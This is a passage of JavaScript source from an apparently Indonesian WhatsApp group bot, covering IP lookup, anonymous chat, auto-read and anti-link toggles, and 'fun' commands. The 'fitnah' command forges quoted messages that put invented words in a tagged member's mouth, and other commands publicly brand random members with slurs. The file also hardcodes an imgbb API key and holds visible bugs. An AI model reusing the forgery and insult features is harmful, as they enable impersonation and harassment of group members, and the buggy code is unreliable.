		   iplu = `${body.slice(9)}`
		   data = await fetchJson(`http://hadi-api.herokuapp.com/api/iplookup/?ip=${iplu}`)
		   lacaks = data.result
		   let kuontoll = `
➸ Country : ${lacaks.country}
➸ Country code : ${lacaks.countryCode}
➸ Region : ${lacaks.region}
➸ Region name : ${lacaks.regionName}
➸ City : ${lacaks.city}
➸ Latitude : ${lacaks.lat}
➸ Longtitude : ${lacaks.lon}
➸ Timezone : ${lacaks.timezone}
➸ Isp : ${lacaks.isp}
➸ Org : ${lacaks.org}
➸ As : ${lacaks.as}`
           freply(kuontoll)
		   break					
   case 'komenyt':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)   
		   gh = body.slice(9)
		   usnm = gh.split("&")[0];
		   cmn = gh.split("&")[1];
		   var imgbb = require('imgbb-uploader')
		   try {
				pp = await pemuda.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		   } catch {
				pp = 'https://i.ibb.co/Tv6JR98/baby.jpg'
		   }
		   media = await getBuffer(pp)
	   	   datae = await imageToBase64(JSON.stringify(pp).replace(/\"/gi, ''))
		   fs.writeFileSync('getpp.jpeg', datae, 'base64')
		   res = await imgbb("7f2cf4cd570b9a442d6fdec16b74dcfc", 'getpp.jpeg')
		   buffer = await getBuffer(`https://some-random-api.ml/canvas/youtube-comment?avatar=${res.display_url}&comment=${cmn}&username=${usnm}`)
	  	   pemuda.sendMessage(from, buffer, image, { caption: 'Nih Kack', contextInfo: { participant: '0@s.whatsapp.net', quotedMessage: { conversation: '*_YOUTUBE COMMENT_*' } } })
		   break

    case 'autojoin':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           if (args[0] == "on") {
           if (autojoin == true) return freply("Sudah aktif!!");
           autojoin = true;
           freply("Sukses mengaktifkan autojoin!");
           } else if (args[0] == "off") {
           autojoin = false;
           freply("Sukses mematikan autojoin!");
           } else if (!q) {
           sendButMessage(from, `MODE AUTOJOIN`, `Silahkan pilih salah satu`, [{buttonId: `${prefix}autojoin on`,buttonText: {displayText: `on`,},type: 1,},{buttonId: `${prefix}autojoin off`,buttonText: {displayText: `off`,}, type: 1}])}
           break		   		   		   	       		   		          		                        	       		   		          		                        		   		          		                        	       		   		          		                        		   		          		                        		   		          		                        		   		          		                        	       		   		          		                        	       		   		          		                        		   		          		                        	       		   		          		                        		   		          		                        		   		          		                        		   		          		                        
    case 'antidelete':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           if (args.length < 1) return freply('Pilih on atau off')
           if (args[0] === "on") {
           if (antidel === true) return
           antidel = true
           freply(`Succes mengaktifkan antidelete`)
           } else if (args[0] === "off") {
           if (antidel === false) return
           antidel = false
           freply(`Succes mematikan antidelete`)
           } else {
           freply(`Pilih on atau off`)
           }
           break
    case 'autorespon':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           if (args.length < 1) return freply('Pilih on atau off')
           if (args[0] === "on") {
           if (autorespon === false) return
           autorespon = false
           freply(`Succes mengaktifkan autorespon`)
           } else if (args[0] === "off") {
           if (autorespon === true) return
           autorespon = true
           freply(`Succes mematikan autorespon`)
           } else {
           freply(`Pilih on atau off`)
           }
           break           
    case 'anticall':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           if (args.length < 1) return freply('Pilih on atau off')
           if (args[0] === "on") {
           if (antical === true) return
           antical = true
           freply(`Succes mengaktifkan anticall`)
           } else if (args[0] === "off") {
           if (antical === false) return
           antical = false
           freply(`Succes mematikan anticall`)
           } else {
           freply(`Pilih on atau off`)
           }
           break
    case 'autoread':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           if (args.length < 1) return freply(`Example:\n${prefix}autoread gc on`)
           if (args[0] === "gc") {
           if (args.length < 2) return freply(`Example:\n${prefix}autoread gc on`)
           if (args[1] === "on") {
           if (readG === true) return
           readG = true
           freply(`Succes mengaktifkan autoread group`)
           } else if (args[1] === "off") {
           if (readG === false) return
           readG = false
           freply(`Succes mematikan autoread group`)
           } else {
           freply(`Pilih on atau off`)
           }
           } else if (args[0] === "pc") {
           if (args.length < 2) return freply(`Example:\n${prefix}autoread pc on`)
           if (args[1] === "on") {
           if (readP === true) return
           readP = true
           freply(`Succes mengaktifkan autoread pribadi`)
           } else if (args[1] === "off") {
           if (readP === false) return
           readP = false
           freply(`Succes mematikan autoread pribadi`)
           } else {
           freply(`Pilih on atau off`)
           }
           } else {
           freply(`*List Auto Read*\n•> gc\n•> pc`)
           }
           break 
           
//<------------------< anonymous chat >---------------->             
   case 'next': 
   case 'keluar':  
   case "stop": {
           if (isGroup) return freply('Fitur Tidak Dapat Digunakan Untuk Group!')
           pemuda.anonymous = pemuda.anonymous ? pemuda.anonymous: {}
           let room = Object.values(pemuda.anonymous).find(room => room.check(sender))
           if (!room) {
           await pemuda.sendButMessage(from, '_*Kamu Tidak Sedang Berada di Anonymous Chat🌹*_', `Ⓒ︎ 𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙`, 'Cari Partner', prefix+'start')
           return false
           }
           freply('_You stopped matchmajar_')
           let other = room.other(sender)
           if (other) await pemuda.sendButMessage(other, '_*Partner meninggalkan chat🌹*_', `Ⓒ︎ 𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙`, 'Cari Partner', prefix+'start')
           delete pemuda.anonymous[room.id]
           if (command === 'keluar' || command === "stop") 
           break
}  
   case 'mulai': 
   case 'start': 
   case "anonymous": 
   case "mutual": {
           if (isGroup) return freply('Fitur Tidak Dapat Digunakan Untuk Group!')   
           pemuda.anonymous = pemuda.anonymous ? pemuda.anonymous: {}
           if (Object.values(pemuda.anonymous).find(room => room.check(sender))) {
           pemuda.sendButMessage(from, 'Kamu Masih Berada Di Dalam Anonymous Chat, Menunggu Partner', `Ⓒ︎ 𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙`, 'Keluar', `${prefix}keluar`)
           return false
           }
           let room = Object.values(pemuda.anonymous).find(room => room.state === 'WAITING' && !room.check(sender))
           if (room) {
           await pemuda.sendButMessage(room.a, '_*Partner ditemukan🌹*_', `Ⓒ︎ 𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙`, 'Next', prefix+'next')
           room.b = sender
           room.state = 'CHATTING'
           await pemuda.sendButMessage(room.b, '_*Partner ditemukan🌹*_', `Ⓒ︎ 𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙`, 'Next', prefix+'next')
           } else {
           let id = + new Date
           pemuda.anonymous[id] = {
           id,
           a: sender,
           b: '',
           state: 'WAITING',
           check: function (who = '') {
           return [this.a,
           this.b].includes(who)
           },
           other: function (who = '') {
           return who === this.a ? this.b: who === this.b ? this.a: ''}}
           sendButMessage(from, '_*Menunggu Partner🌹*_', `Ⓒ︎ 𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙`, [{buttonId: `${prefix}keluar`,buttonText: {displayText: `Keluar`,}, type: 1}])}                  
           break
}                      

//<------------------< Fun >---------------->  
    case 'darkjokes':
           //if (!isRegister) return freply(mess.only.regis)    
	  	   data = fs.readFileSync('./lib/darkjokes.js');
	 	   jsonData = JSON.parse(data);
		   randIndex = Math.floor(Math.random() * jsonData.length);
		   randKey = jsonData[randIndex];
		   hasil = await getBuffer(randKey.result)
	       pemuda.sendMessage(from, hasil, image, {quoted: fkontak, caption: 'Awokwowkwok'})
		   break		   
    case 'fitnah': 
           //if (!isRegister) return freply(mess.only.regis)               
           if (args.length < 1) return freply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
           var gh = args.join('')
           mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
           var replace = gh.split("|")[0];
           var target = gh.split("|")[1];
           var bot = gh.split("|")[2];
           pemuda.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
           break
    case 'wangy': 
           //if (!isRegister) return freply(mess.only.regis)                   
           if (!q) return
           qq = q.toUpperCase()
           awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
           freply(awikwok)
           break
    case 'mining':   
           //if (!isRegister) return freply(mess.only.regis)           
           var mining = randomNomor(1000)
           atm.addKoinUser(sender, mining, _uang)
           await freply(`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`)
           break
    case 'waktu':
           //if (!isRegister) return freply(mess.only.regis)   
           freply(`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`)
           break
    case 'cekmati':
           //if (!isRegister) return freply(mess.only.regis)                  
           if (!q) return freply(mess.wrongFormat)
           predea = await axios.get(`https://api.agify.io/?name=${q}`)
           freply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
           break
    case 'toxic':
           //if (!isRegister) return freply(mess.only.regis)    
           Toxic().then(toxic => {
           freply(Toxic)
})
           break
    case 'citacita': 
           //if (!isRegister) return freply(mess.only.regis)               
           const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']
           const cita3 = cita[Math.floor(Math.random() * cita.length)]
           cita2 = await getBuffer(cita3)
           pemuda.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: mek})
           break
    case 'apakah': 
           //if (!isRegister) return freply(mess.only.regis)               
           apakah = body.slice(1)
           const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
           const kah = apa[Math.floor(Math.random() * apa.length)]
           pemuda.sendMessage(from, '*Pertanyaan :* '+apakah+'\n*Jawaban :* '+ kah, text, { quoted: mek })
           break
    case 'rate':
    case 'nilai': 
           //if (!isRegister) return freply(mess.only.regis)              
           rate = body.slice(1)
           const ra =['0','4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
           const te = ra[Math.floor(Math.random() * ra.length)]
           pemuda.sendMessage(from, '*Pertanyaan :* '+rate+'\n*Jawaban :* '+ te+'%', text, { quoted: mek })
           break
    case 'gantengcek':
    case 'cekganteng':
           //if (!isRegister) return freply(mess.only.regis)                
           ganteng = body.slice(1)
           const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
           const teng = gan[Math.floor(Math.random() * gan.length)]
           pemuda.sendMessage(from, '*Pertanyaan :* '+ganteng+'\n*Jawaban :* '+ teng+'%', text, { quoted: mek })
           break
    case 'cantikcek':
    case 'cekcantik':
            //if (!isRegister) return freply(mess.only.regis)                
            cantik = body.slice(1)
            const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
            const tik = can[Math.floor(Math.random() * can.length)]
            pemuda.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: mek })
            break
    case 'cekbapak': // By Ramlan ID
 
            //if (!isRegister) return freply(mess.only.regis)               
		    const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#Candabos', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Canda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk']

		    const cek = bapak[Math.floor(Math.random() * bapak.length)]

		    pemuda.sendMessage(from, cek, text, { quoted: ftroli })

			break
    case 'cekwatak': 
            //if (!isRegister) return freply(mess.only.regis)               
            var namao = pushname
            var prfx = await pemuda.getProfilePicture(sender)
            const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
            const wtk = watak[Math.floor(Math.random() * (watak.length))]
            const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
            const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
            const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
            const sft = sifat[Math.floor(Math.random() * (sifat.length))]
            const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colmek','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
            const hby = hobby[Math.floor(Math.random() * (hobby.length))]
            const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
            const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
            const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
            const typo = tipe[Math.floor(Math.random() * (tipe.length))]
            await freply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
            break
    case 'hobby': 
            //if (!isRegister) return freply(mess.only.regis)               
            hobby1 = body.slice(1)
            const by = hobby1[Math.floor(Math.random() * hobby1.length)]
            pemuda.sendMessage(from, 'Pertanyaan : *'+hobby1+'*\n\nJawaban : '+ by, text, { quoted: mek })
            break
    case 'bisakah':
            //if (!isRegister) return freply(mess.only.regis)                
            bisakah = body.slice(1)
            const bisa =['Bisa','Tidak Bisa','Coba Ulangi','MANA GW TAU']
            const keh = bisa[Math.floor(Math.random() * bisa.length)]
            pemuda.sendMessage(from, '*Pertanyaan :* '+bisakah+'\n*Jawaban :* '+ keh, text, { quoted: mek })
            break
    case 'kapankah': 
            //if (!isRegister) return freply(mess.only.regis)               
            kapankah = body.slice(1)
            const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
            const koh = kapan[Math.floor(Math.random() * kapan.length)]
            pemuda.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: mek })
            break
    case 'truth': 
            //if (!isRegister) return freply(mess.only.regis)               
            const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
            const ttrth = trut[Math.floor(Math.random() * trut.length)]
            truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
            pemuda.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: mek })
            break
    case 'dare': 
            //if (!isRegister) return freply(mess.only.regis)               
            const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "??💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
            const der = dare[Math.floor(Math.random() * dare.length)]
            buffer = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
            pemuda.sendMessage(from, buffer, image, { quoted: mek, caption: '*Dare*\n\n'+ der })
            break		
    case 'jadian':
            //if (!isRegister) return freply(mess.only.regis)    
            jds = []
            jdii = groupMembers
            koss = groupMembers
            akuu = jdii[Math.floor(Math.random() * jdii.length)]
            diaa = koss[Math.floor(Math.random() * koss.length)]
            teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  ( ♥️ ) @${diaa.jid.split('@')[0]} `
            jds.push(akuu.jid)
            jds.push(diaa.jid)
            mentions(teks, jds, true)
            break
    case 'cantik': 
            //if (!isRegister) return freply(mess.only.regis)               
            membr = []
            const mes = groupMembers
            const msk = groupMembers
            const siaps = mes[Math.floor(Math.random() * mes.length)]
            const sips = pushname[Math.floor(Math.random() * msk.length)]
            teks = `*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
            membr.push(siaps.jid)
            mentions(teks, membr, true)
            break
    case 'ganteng':
            //if (!isRegister) return freply(mess.only.regis)                
            membr = []
            const nus = groupMembers
            const msl = groupMembers
            const siapss = nus[Math.floor(Math.random() * nus.length)]
            const sipss = pushname[Math.floor(Math.random() * msl.length)]
            teks = `*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`
            membr.push(siapss.jid)
            mentions(teks, membr, true)
            break
    case 'babi': 
            //if (!isRegister) return freply(mess.only.regis)               
            membr = []
            const meg = groupMembers
            const mge = groupMembers
            const ba = meg[Math.floor(Math.random() * meg.length)]
            const bi = pushname[Math.floor(Math.random() * mge.length)]
            teks = `*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`
            membr.push(ba.jid)
            mentions(teks, membr, true)
            break
    case 'beban': 
            //if (!isRegister) return freply(mess.only.regis)               
            membr = []
            const nge = groupMembers
            const tod = groupMembers
            const beb = nge[Math.floor(Math.random() * nge.length)]
            const biw = pushname[Math.floor(Math.random() * tod.length)]
            teks = `*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`
            membr.push(beb.jid)
            mentions(teks, membr, true)
            break 
    case 'kontol': 
            //if (!isRegister) return freply(mess.only.regis)               
            membr = []
            const qw = groupMembers
            const poq = groupMembers
            const ert = qw[Math.floor(Math.random() * qw.length)]
            const owe = pushname[Math.floor(Math.random() * poq.length)]
            teks = `*Yang Paling Terkontol Disini Adalah :* @${ert.jid.split('@')[0]}`
            membr.push(ert.jid)
            mentions(teks, membr, true)
            break 
    case 'alay':
            //if (!isRegister) return freply(mess.only.regis)    
            membr = []
            const cok = groupMembers
            const asw = groupMembers
            const uyy = cok[Math.floor(Math.random() * cok.length)]
            const poww = pushname[Math.floor(Math.random() * asw.length)]
            teks = `*Yang Paling Alay Disini Adalah :* @${uyy.jid.split('@')[0]}`
            membr.push(uyy.jid)
            mentions(teks, membr, true)
            break                                               
    case 'anjing':  
            //if (!isRegister) return freply(mess.only.regis)              
            membr = []
            const uwes = groupMembers
            const aswi = groupMembers
            const uuyy = uwes[Math.floor(Math.random() * uwes.length)]
            const powyw = pushname[Math.floor(Math.random() * aswi.length)]
            teks = `*Yang Paling Teranjing Disini Adalah :* @${uuyy.jid.split('@')[0]}`
            membr.push(uuyy.jid)
            mentions(teks, membr, true)
            break

                                                                                                                        
//<------------------< Enable / Disable >---------------->
    case 'antilink':
    case 'antilink enable':  
    case 'antilink disable':  
    case 'kojskaks':
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)        
            buttonnss = [{buttonId: `ink89 enable`, buttonText: {displayText: 'ENABLE'}, type: 1},{buttonId: `ink89 disable`, buttonText: {displayText: 'DISABLE'}, type: 1}]
            const bufMess = {
            contentText: "*Pilih Antilink Apa Kak✨*",
            footerText: 'Silahkan Pilih Salah Satu☕',
            buttons: buttonnss,
            headerType: 1
}
            await pemuda.sendMessage(from, bufMess, MessageType.buttonsMessage, {quoted: fgif})
            break 	
    case 'ink89':
            //if (!isRegister) return freply(mess.only.regis)
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)
            if (!isBotGroupAdmins) return freply(`Bot Harus jadi Admin`)
            if (!q) return freply(`Pilih enable atau disable`)
            if (args[0].toLowerCase() === 'enable'){
            if (isAntiLink) return freply(`Udah aktif`)
            antilink.push(from)
            fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
            freply('Sukses mengaktifkan fitur antilink di group ini ✔️')
            } else if (args[0].toLowerCase() === 'disable'){
            let anu = antilink.indexOf(from)
            antilink.splice(anu, 1)
            fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
            freply('Sukses menonaktifkan fitur antilink di group ini ✔️')
            } else {
            freply(`Enable untuk mengaktifkan, disable untuk menonaktifkan`)
}
            break 
    case 'antilinkyt':
    case 'antilinkyt enable': 
    case 'antilinkyt disable':       
    case 'antilinkyoutube enable':         
    case 'antilinkyoutube disable': 
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)         
            buttonnss = [{buttonId: `kyt89 enable`, buttonText: {displayText: 'ENABLE'}, type: 1},{buttonId: `kyt89 disable`, buttonText: {displayText: 'DISABLE'}, type: 1}]
            const bufiMess = {
            contentText: "*Pilih AntilinkYt Apa Kak✨*",
            footerText: 'Silahkan Pilih Salah Satu☕',
            buttons: buttonnss,
            headerType: 1
}
            await pemuda.sendMessage(from, bufiMess, MessageType.buttonsMessage, {quoted: fgif})
            break                  
    case 'kyt89':    
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)
            if (!isBotGroupAdmins) return freply(`Bot Harus jadi Admin`)
            if (!q) return freply(`Pilih enable atau disable`)
            if (args[0].toLowerCase() === 'enable'){
            if (isAntiLinkYt) return freply(`Udah aktif`)
            antilinkyt.push(from)
            fs.writeFileSync('./database/antilinkyt.json', JSON.stringify(antilink))
            freply('Sukses mengaktifkan fitur antilink youtube di group ini ✔️')
            } else if (args[0].toLowerCase() === 'disable'){
            let anu = antilinkyt.indexOf(from)
            antilinkyt.splice(anu, 1)
            fs.writeFileSync('./database/antilinkyt.json', JSON.stringify(antilink))
            freply('Sukses menonaktifkan fitur antilink youtube di group ini ✔️')
            } else {
            freply(`Enable untuk mengaktifkan, disable untuk menonaktifkan`)
}
            break

    case 'antiwame':            
    case 'antilinkwame':
    case 'antilinkwame enable': 
    case 'antilinkwame disable':       
    case 'antilinkwa.me enable':         
    case 'antilinkwa.me disable': 
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)         
            buttonnss = [{buttonId: `akwame89 enable`, buttonText: {displayText: 'ENABLE'}, type: 1},{buttonId: `akwame89 disable`, buttonText: {displayText: 'DISABLE'}, type: 1}]
            const bufikMess = {
            contentText: "*Pilih Antilink Wa Apa Kak✨*",
            footerText: 'Silahkan Pilih Salah Satu☕',
            buttons: buttonnss,
            headerType: 1
}
            await pemuda.sendMessage(from, bufikMess, MessageType.buttonsMessage, {quoted: fgif})
            break                     
    case 'akwame89':
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)
            if (!isBotGroupAdmins) return freply(`Bot Harus jadi Admin`)
            if (!q) return freply(`Pilih enable atau disable`)
            if (args[0].toLowerCase() === 'enable'){
            if (isAntiLinkWa) return freply(`Udah aktif`)
            antilinkwame.push(from)
            fs.writeFileSync('./database/antilinkwame.json', JSON.stringify(antilink))
            freply('Sukses mengaktifkan fitur antilinkwame di group ini ✔️')
            } else if (args[0].toLowerCase() === 'disable'){
            let anu = antilinkwame.indexOf(from)
            antilinkwame.splice(anu, 1)
            fs.writeFileSync('./database/antilinkwame.json', JSON.stringify(antilink))
            freply('Sukses menonaktifkan fitur antilinkwame di group ini ✔️')
            } else {
            freply(`Enable untuk mengaktifkan, disable untuk menonaktifkan`)
}
            break
                                                                                                                                                                                                                                                                                                           
    case 'antivo':
    case 'antiviewonce':    
    case 'antivo enable': 
    case 'antivo disable':       
    case 'antiviewonce enable':         
    case 'antiviewonce disable': 
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)         
